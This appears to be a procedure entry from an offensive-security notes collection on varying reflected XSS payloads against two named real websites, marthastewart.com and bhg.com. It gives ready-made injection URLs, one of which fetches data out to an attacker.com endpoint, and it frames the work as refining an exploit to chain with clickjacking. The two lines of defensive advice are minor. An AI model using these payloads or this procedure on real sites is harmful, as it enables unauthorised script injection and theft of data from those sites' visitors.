---
id: uuid-proc-3
tags:
  - xss
  - payload-testing
  - cross-domain
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.903Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Test-XSS-Payload-Variations

## Summary

This procedure involves experimenting with different XSS payloads to optimize for cross-domain effects and reliability in the reflected context.

## Description

After basic confirmation, vary payloads to include domain-specific JavaScript like document.domain access, enhancing potential for data exfiltration across marthastewart.com and bhg.com. This step refines the exploit for chaining with clickjacking and is performed manually in a browser.

## Requirements

1. Web browser developer console
2. List of test payloads
3. Vulnerable endpoint access

## Defense

Defensive measures and detection strategies:

- Use strict output encoding (e.g., HTML entity encoding)
- Log and alert on multiple failed payload attempts

## Objectives

1. Identify effective payload variations
2. Test for cross-domain JavaScript access
3. Prepare payloads for POC integration

## Instructions

### Step 1: Basic Domain Test

**Context**: Inject a payload targeting document.domain to check cross-domain behavior.

Load https://marthastewart.com/shop/all.html?s=<script>alert(document.domain)</script>.

> Alert shows the domain, confirming JS context and potential for multi-domain attacks.

### Step 2: Advanced Exfiltration Test

**Context**: Test a payload that sends data externally.

Use https://bhg.com/shop/all.html?s=<script>fetch('http://attacker.com?data='+document.domain)</script>.

> Network tab shows request to attacker endpoint, validating exfiltration capability.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-testing]]
- [[cross-domain]]
